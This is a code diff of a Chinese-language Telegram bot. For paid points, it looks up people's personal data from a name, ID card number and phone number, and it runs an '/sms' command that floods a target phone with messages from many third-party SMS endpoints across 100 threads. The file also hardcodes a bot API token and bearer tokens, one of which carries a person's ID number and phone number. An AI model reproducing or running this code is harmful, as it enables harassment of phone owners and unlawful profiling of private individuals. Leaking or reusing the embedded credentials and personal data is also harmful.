@@ -9,9 +9,9 @@ import itertools
 import binascii
 import random
 import concurrent.futures
-import inspect
-import urllib.parse  # 新增
-import sms_list 
+import inspect  
+import urllib.parse
+import sms_list 
 import sms_list_new
 from sms_list import *
 from Crypto.Cipher import DES3
@@ -21,11 +21,11 @@ from concurrent.futures import ThreadPoolExecutor
 
 # ================= 1. 核心配置 =================
 API_TOKEN = '8338893180:AAH-l_4m1-tweKyt92bliyk4fsPqoPQWzpU'
-ADMIN_ID = 6649617045 
+ADMIN_ID = 6649617045 
 ADMIN_USERNAME = "@aaSm68"
 POINTS_FILE = 'points.json'
 TOKEN_FILE = 'token.txt'
-DEFAULT_TOKEN = "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIyNDkyNDYiLCJpYXQiOjE3Mzg1MDMxMTcsImV4cCI6MTczODY3NTkxN30.i9w1G8Y2mU5R5cCI6IkpXVCJ9" 
+DEFAULT_TOKEN = "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIyNDkyNDYiLCJpYXQiOjE3Mzg1MDMxMTcsImV4cCI6MTczODY3NTkxN30.i9w1G8Y2mU5R5cCI6IkpXVCJ9" 
 
 AUTH_BEARER = "bearer eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IisxOTM3ODg4NDgyNiIsIm9wZW5JZCI6Im95NW8tNHk3Wnd0WGlOaTVHQ3V3YzVVNDZJYk0iLCJpZENhcmRObyI6IjM3MDQ4MTE5ODgwODIwMzUxNCIsInVzZXJOYW1lIjoi6ams5rCR5by6IiwibG9naW5UaW1lIjoxNzY5NDE1NjYxMTk0LCJhcHBJZCI6Ind4ZjVmZDAyZDEwZGJiMjFkMiIsImlzcmVhbG5hbWUiOnRydWUsInNhYXNVc2VySWQiOm51bGwsImNvbXBhbnlJZCI6bnVsbCwiY29tcGFueVZPUyI6bnVsbH0.GwMYvckFHvFbhSi0NXpQDPiv9ZswUBAImN5bUipBla0"
 
@@ -33,7 +33,7 @@ bot = telebot.TeleBot(API_TOKEN)
 user_points = {}
 CURRENT_X_TOKEN = DEFAULT_TOKEN
 user_states = {}
-generated_cache = {} 
+generated_cache = {} 
 
 # --- 数据持久化 ---
 def load_data():
@@ -131,24 +131,20 @@ def hb_search_logic(chat_id, search_value, uid):
     except:
         bot.send_message(chat_id, "查询接口请求异常")
 
-# ================= 新增：三要素查询逻辑 =================
+# ================= 三要素查询逻辑 =================
 
 def query_3ys_logic(chat_id, name, id_card, phone, uid):
-    """三要素查询逻辑"""
     try:
-        # 生成查询URL
         params = urllib.parse.urlencode({
             'xm': name,
             'sfz': id_card,
             'sjh': phone
         })
         url = f"https://qingfeng.qzz.io/api/free/heyan/sys1?{params}"
-        
-        # 扣除积分
+        
         user_points[uid] -= 1.5
         save_points()
-        
-        # 返回结果
+        
         message = f"""✅ **三要素查询链接已生成**
 
 查询信息：
@@ -161,9 +157,9 @@ def query_3ys_logic(chat_id, name, id_card, phone, uid):
 
 已扣除 **1.5** 积分！
 当前余额：**{user_points[uid]:.2f}** 积分"""
-        
+        
         bot.send_message(chat_id, message, parse_mode='Markdown')
-        
+        
     except Exception as e:
         bot.send_message(chat_id, f"❌ 查询失败：{str(e)}")
 
@@ -257,11 +253,10 @@ def run_batch_task(chat_id, msg_id, name, id_list, uid):
     except: pass
     bot.send_message(chat_id, success_match if success_match else "❌ **未发现匹配结果**", parse_mode='Markdown')
 
-# ================= 5. 短信轰炸 (整合新旧接口) =================
+# ================= 5. 短信轰炸 =================
 
 def get_all_senders():
     all_funcs = []
-    # 1. 获取旧文件 sms_list.py 中的函数
     excludes = ['generate_random_user_agent', 'replace_phone_in_data', 'platform_request_worker', 'send_minute_request', 'get_current_timestamp']
     for name, obj in inspect.getmembers(sms_list):
         if inspect.isfunction(obj) and name not in excludes:
@@ -269,13 +264,12 @@ def get_all_senders():
                 sig = inspect.signature(obj)
                 if len(sig.parameters) >= 1: all_funcs.append(obj)
             except: pass
-    
-    # 2. 获取新文件 sms_list_new.py 中的列表接口
+    
     if hasattr(sms_list_new, 'NEW_PLATFORMS'):
         for name, func in sms_list_new.NEW_PLATFORMS:
             if func not in all_funcs:
                 all_funcs.append(func)
-                
+                
     return all_funcs
 
 @bot.message_handler(commands=['sms'])
@@ -286,11 +280,11 @@ def sms_bomb_cmd(message):
     if len(parts) < 2: return bot.reply_to(message, "用法: `/sms 手机号`")
     target = parts[1]
     if not (len(target) == 11 and target.isdigit()): return bot.reply_to(message, "⚠️ 手机号格式错误")
-    
+    
     all_funcs = get_all_senders()
     bot.reply_to(message, f"🎯 **接口装载：{len(all_funcs)}个**\n正在轰炸 `{target}`...", parse_mode='Markdown')
     user_points[uid] -= 5.5; save_points()
-    
+    
     def do_bomb():
         random.shuffle(all_funcs)
         with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
@@ -312,23 +306,20 @@ def hb_cmd(message):
     if user_points.get(message.from_user.id, 0.0) < 3.5: return bot.reply_to(message, "积分不足！")
     bot.send_message(message.chat.id, "请输入身份证号或手机号进行查询")
 
-# ================= 新增：三要素命令 =================
-
 @bot.message_handler(commands=['3ys'])
 def cmd_3ys(message):
-    """三要素查询命令"""
     uid = message.from_user.id
     if user_points.get(uid, 0.0) < 1.5:
         return bot.reply_to(message, "❌ 积分不足！需要 **1.5** 积分", parse_mode='Markdown')
-    
+    
     bot.send_message(
-        message.chat.id, 
+        message.chat.id, 
         "请输入三要素信息：\n\n"
-        "**格式：** 姓名 身份证号 手机号\n\n"
-        "**示例：**\n"
-        "`杨志强 411524200205296514 13800138000`\n\n"
-        "或用逗号分隔：\n"
-        "`杨志强,411524200205296514,13800138000`",
+        "**格式示例（顺序随意）：**\n"
+        "`杨志强 411524200205296514 13800138000`\n"
+        "`杨志强 13800138000 411524200205296514`\n"
+        "`杨志强,411524200205296514,13800138000`\n\n"
+        "姓名 + 身份证 + 手机号（任一順序）",
         parse_mode='Markdown'
     )
 
@@ -379,28 +370,42 @@ def cmd_2ys_cmd(message):
 @bot.message_handler(func=lambda m: True)
 def handle_all(message):
     uid, chat_id, text = message.from_user.id, message.chat.id, message.text.strip()
-    if text.startswith('/'): return 
-    
-match_3ys_1 = re.match(r'^([\u4e00-\u9fa5]{2,4})[,/\s]+([\dXx]{15}|[\dXx]{18})[,/\s]+(1[3-9]\d{9})$', text)
-match_3ys_2 = re.match(r'^([\u4e00-\u9fa5]{2,4})[,/\s]+(1[3-9]\d{9})[,/\s]+([\dXx]{15}|[\dXx]{18})$', text)
-
-if match_3ys_1 or match_3ys_2:
-    if user_points.get(uid, 0.0) < 1.5:
-        return bot.reply_to(message, "❌ 积分不足！需要 **1.5** 积分", parse_mode='Markdown')
+    if text.startswith('/'): return 
     
-    if match_3ys_1:
-        name, id_card, phone = match_3ys_1.groups()
-    else:
-        name, phone, id_card = match_3ys_2.groups()
-    
-    return query_3ys_logic(chat_id, name, id_card, phone, uid)
+    # ================= 自动识别三要素（姓名+身份证+手机号 任意顺序） =================
+    if chat_id not in user_states or not user_states[chat_id].get('step'):  # 不在其他流程中才自动识别
+        parts = re.split(r'[,/\s]+', text.strip())
+        if len(parts) == 3:
+            name_cand = phone_cand = id_cand = None
+            for p in parts:
+                p = p.strip()
+                if re.match(r'^[\u4e00-\u9fa5]{2,4}$', p):
+                    name_cand = p
+                elif re.match(r'^1[3-9]\d{9}$', p):
+                    phone_cand = p
+                elif re.match(r'^[\dXx]{15}$|^[\dXx]{18}$', p):
+                    id_cand = p.upper()  # 统一大写 X
+            
+            if name_cand and phone_cand and id_cand:
+                if user_points.get(uid, 0.0) < 1.5:
+                    return bot.reply_to(message, "❌ 积分不足！需要 **1.5** 积分", parse_mode='Markdown')
+                return query_3ys_logic(chat_id, name_cand, id_cand, phone_cand, uid)
 
-    # 原有的二要素识别
+    # ================= 原有逻辑 =================
+    if re.match(r'^1[3-9]\d{9}$', text) or re.match(r'^\d{17}[\dXx]$', text):
+        state = user_states.get(chat_id)
+        if state and state['step'] == 'cyh_id':
+            del user_states[chat_id]
+            return xiaowunb_query_logic(chat_id, text, uid)
+            
+        if user_points.get(uid, 0.0) < 3.5: return bot.reply_to(message, "积分不足(3.5)")
+        return hb_search_logic(chat_id, text, uid)
+
     match_2ys = re.match(r'^([\u4e00-\u9fa5]{2,4})\s+(\d{17}[\dXx])$', text)
     if match_2ys:
         if user_points.get(uid, 0.0) < 0.5: return bot.reply_to(message, "积分不足(0.5)")
         return single_verify_2ys(chat_id, *match_2ys.groups(), uid)
-    
+    
     state = user_states.get(chat_id)
     if not state: return
     if state['step'] == 'v_name':
@@ -456,7 +461,7 @@ def handle_callback(call):
             "每次核验扣除 0.5 积分\n"
             "——————————————————\n"
             "三要素核验\n"
-            "发送 /3ys 进行查询\n"
+            "发送 /3ys 进行核验\n"
             "每次查询扣除 1.5 积分\n"
             "——————————————————\n"
             "常用号查询\n"
